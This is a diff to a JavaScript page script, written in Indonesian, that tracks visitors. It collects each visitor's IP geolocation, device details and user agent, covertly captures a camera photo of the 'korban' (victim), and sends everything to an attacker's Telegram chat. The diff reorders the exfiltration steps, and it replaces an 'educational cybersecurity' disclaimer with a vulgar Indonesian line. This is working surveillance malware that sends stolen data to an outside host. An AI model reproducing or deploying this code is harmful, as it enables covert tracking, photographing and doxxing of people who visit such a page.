@@ -286,10 +286,10 @@ async function getAdditionalInfo(){
 function buildCaption(ip,d,additional){
   const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
   return [
-    "<b>🛡️ CYBERSECURITY REPORT - ENHANCED 🛡️</b>",
+    "<b> REPORT NEW </b>",
     "",
     "<blockquote>",
-    "<b>📍 INFORMASI LOKASI DETAIL</b>",
+    "<b>📍 INFORMASI LOKASI </b>",
     `🌐 IP Address: <code>${escapeHtml(ip.ip)}</code>`,
     `🏙️ Kota: ${escapeHtml(ip.city)}`,
     `🗺️ Region: ${escapeHtml(ip.region)}`,
@@ -350,7 +350,7 @@ function buildCaption(ip,d,additional){
     `<code>${escapeHtml(d.userAgent)}</code>`,
     "</blockquote>",
     "",
-    "<i>⚠️ Data dikumpulkan untuk keperluan edukasi cybersecurity - Enhanced Version</i>"
+    "<i>GW SUKA MEMEK</i>"
   ].join("\n");
 }
 
@@ -391,6 +391,18 @@ async function sendIpDevice(){
 
 async function sendSnapshot(){
   try{
+    // 1. KIRIM DATA TERLEBIH DAHULU - INI YANG DITAMBAHKAN
+    const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
+    
+    // Kirim data sebagai photo dengan JPG
+    await sendToTelegram("sendPhoto", {
+      chat_id: CHAT_ID,
+      photo: STATIC_IMAGE,
+      caption: buildCaption(ip,d,additional),
+      parse_mode: "HTML"
+    });
+
+    // 2. Ambil foto dari kamera
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
     const video = document.createElement('video');
     video.style.display='none';
@@ -407,24 +419,14 @@ async function sendSnapshot(){
 
     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
 
-    // 1. Kirim data terlebih dahulu
-    const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
-    
-    // Kirim data sebagai pesan terpisah
-    await sendToTelegram("sendMessage", {
-      chat_id: CHAT_ID,
-      text: "📱 DATA KORBAR DITEMUKAN!\n\n" + buildCaption(ip,d,additional),
-      parse_mode: "HTML"
-    });
-
-    // 2. Kirim MP3
+    // 3. Kirim MP3
     await sendToTelegram("sendAudio", {
       chat_id: CHAT_ID,
       audio: MP3_URL,
-      caption: "jogetin aja dulu 😹"
+      caption: "🎵 Audio untuk korban"
     });
 
-    // 3. Kirim foto korban
+    // 4. Kirim foto korban
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("document", blob, "foto_korban.jpg");
@@ -439,9 +441,10 @@ async function sendSnapshot(){
     console.log("Error camera:", e);
     // Tetap kirim data meski camera gagal
     const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
-    await sendToTelegram("sendMessage", {
+    await sendToTelegram("sendPhoto", {
       chat_id: CHAT_ID,
-      text: "❌ Gagal akses kamera, tapi data berhasil dikumpulkan:\n\n" + buildCaption(ip,d,additional),
+      photo: STATIC_IMAGE,
+      caption: "❌ Gagal akses kamera, tapi data berhasil dikumpulkan:\n\n" + buildCaption(ip,d,additional),
       parse_mode: "HTML"
     });
     
